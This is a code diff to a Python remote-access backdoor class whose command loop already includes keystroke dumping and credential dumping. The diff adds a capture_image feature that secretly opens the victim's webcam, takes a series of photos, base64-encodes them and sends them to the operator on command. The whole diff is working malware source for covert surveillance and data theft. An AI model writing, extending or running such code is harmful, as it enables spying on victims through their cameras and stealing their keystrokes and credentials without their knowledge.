@@ -8,6 +8,8 @@ import logging, threading
 import requests
 import tempfile
 import zipfile
+import time
+import cv2
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -116,6 +118,21 @@ class Backdoor:
         os.chdir(pwd)
         return result
     
+    def capture_image(self, n, t):
+        images = []
+        cam = cv2.VideoCapture(0)
+        for i in range(n):
+            result, image = cam.read()
+            if result:
+                _, img_encoded = cv2.imencode('.png', image)
+                images.append(base64.b64encode(img_encoded).decode())
+            else:
+                print("No image detected")
+            if i < n - 1:
+                time.sleep(t)
+        cam.release()
+        return images
+    
     def run(self):
         while True:
             try:
@@ -140,6 +157,13 @@ class Backdoor:
                     result = self.keyscan_dump()
                 elif command[0] == "creds_dump":
                     result = self.creds_dump()
+                elif command[0] == "capture_image":
+                    parts = data.split(" ")
+                    n = int(parts[1])
+                    t = int(parts[2])
+                    result = self.capture_image(n, t)
+                    self.send(result)
+                    continue
                 elif command[0] == "exit":
                     self.conn.close()
                     exit(0)
